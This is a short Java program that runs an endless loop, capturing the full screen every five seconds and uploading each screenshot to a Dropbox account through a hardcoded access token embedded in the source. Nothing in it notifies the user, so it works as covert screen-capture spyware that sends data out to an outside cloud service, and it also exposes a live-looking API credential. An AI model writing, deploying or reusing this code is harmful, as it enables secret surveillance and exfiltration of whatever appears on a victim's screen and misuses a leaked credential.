import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;


import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;

import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Application {
    public static void main(String[] args) {

        String ACCESS_TOKEN = "-rDwJpP4ChAAAAAAAAABC_Qz3WzyMI8nEzR0bYDObFOsyeGDwqOwSjjefJvfxrus";


        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        for (; ; ) {
            try {
                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd hh mm ss");
                Date currentDate = new Date();

                BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ByteArrayOutputStream os = new ByteArrayOutputStream();
                ImageIO.write(image, "png", os);
                InputStream in = new ByteArrayInputStream(os.toByteArray());
                client.files().uploadBuilder("/" + dateFormat.format(currentDate)+ ".png").uploadAndFinish(in);

                Thread.sleep(5000);

            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }


}

